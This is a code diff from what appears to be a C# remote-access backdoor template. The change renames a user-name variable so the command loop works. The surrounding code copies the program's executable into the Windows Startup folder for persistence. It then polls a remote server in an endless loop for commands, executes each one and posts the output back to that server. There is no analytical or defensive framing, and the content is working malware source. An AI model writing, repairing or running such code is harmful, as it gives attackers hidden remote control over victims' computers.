@@ -50,9 +50,10 @@ class Program {
       http_post(httpmost, "res="+backuot);
     }
 end firs code*/
-string user_name = System.Environment.UserName;
+string user_name2 = System.Environment.UserName;
 /*auto run
     try{
+      string user_name = System.Environment.UserName;
       string exe_name = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
       string sourceFile = @"" + exe_name;
       string destinationFile = @"C:\Users\" + user_name + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\<FEXENAME>";
@@ -62,7 +63,7 @@ end auto run*/
 
     while(true){
       using (WebClient client = new WebClient()){
-        string getcommand = client.DownloadString(httpmost+"?get=cmd&user_name="+user_name).Replace("\n", "");
+        string getcommand = client.DownloadString(httpmost+"?get=cmd&user_name="+user_name2).Replace("\n", "");
         if(getcommand != "0"){
           string backuot = execodec(getcommand);
           http_post(httpmost, "res="+backuot);
